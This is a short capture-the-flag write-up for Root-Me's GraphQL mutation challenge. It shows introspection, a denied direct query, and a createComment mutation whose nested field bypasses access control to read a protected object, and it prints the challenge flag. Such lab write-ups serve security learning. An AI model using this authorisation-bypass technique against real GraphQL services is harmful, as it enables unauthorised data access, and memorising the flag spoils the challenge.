# [GraphQL - Mutation](https://www.root-me.org/fr/Challenges/Web-Serveur/GraphQL-Mutation)

## Statement

Find the admin's little secret.

## Analysis

1. use GraphQL Playground to introspect graphql endpoint => flag location:

    ![flag-location.jpg](./image/GraphQL%20-%20Mutation%201.png)

2. direct query to flag:

    ```graphql
    {
      nude {
        id
        flag
      }
    }
    ```

    response:

    ```json
    {"errors":[{"message":"You cannot access my nude !!!","locations":[{"line":3,"column":11}],"path":["nude"],"extensions":{"code":"INTERNAL_SERVER_ERROR"}}],"data":{"nude":null}}
    ```

## Exploit

1. found a mutation that contains `nude`:

    ![mutation.jpg](./image/GraphQL%20-%20Mutation%202.png)

2. get flag:

    ```graphql
    {"variables":{"userId":1,"postId":1,"nudeId":2,"comment":"test"},"query":"mutation CreateComment($userId: Int, $postId: Int, $nudeId: Int, $comment: String!)\n        {\n          createComment(userId: $userId, postId: $postId, nudeId: $nudeId, comment: $comment) {\r\n\t\t\t\t\t\tnude { flag }\r\n\t\t\t\t\t}\n        }\n      "}
    ```

    - variables:

      ```json
      {"userId":1,"postId":1,"nudeId":2,"comment":"test"}
      ```

    - query:

      ```graphql
      mutation CreateComment($userId: Int, $postId: Int, $nudeId: Int, $comment: String!)
              {
                createComment(userId: $userId, postId: $postId, nudeId: $nudeId, comment: $comment) {
            nude { flag }
          }
              }
      ```

    response:

    ```json
    {"data":{"createComment":{"nude":[{"flag":"GraphQLDoesNeedAccessControl!!!!!!"}]}}}
    ```
